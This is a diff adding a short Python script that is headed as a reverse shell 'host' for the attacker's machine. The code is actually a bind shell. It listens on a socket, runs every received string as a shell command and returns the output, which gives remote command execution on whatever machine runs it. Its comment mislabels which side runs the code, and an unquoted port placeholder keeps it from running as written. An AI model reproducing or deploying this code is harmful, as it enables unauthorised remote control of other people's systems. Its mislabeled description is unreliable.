@@ -1,0 +1,29 @@
+# Reverse Shell Host (attacker's machine)
+import socket
+import subprocess
+
+# Set the attacker's listening IP and port
+listener_ip = 'your_listener_ip'
+listener_port = your_listener_port
+
+def start_listener():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((listener_ip, listener_port))
+    s.listen(5)
+    print(f"Listening on {listener_ip}:{listener_port}")
+    conn, addr = s.accept()
+    print(f"Connection from {addr[0]}:{addr[1]}")
+
+    while True:
+        command = conn.recv(1024).decode('utf-8')
+        if 'exit' in command:
+            conn.close()
+            break
+        else:
+            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = output_bytes.decode('utf-8')
+            conn.send(output_str.encode('utf-8'))
+
+if __name__ == '__main__':
+    start_listener()
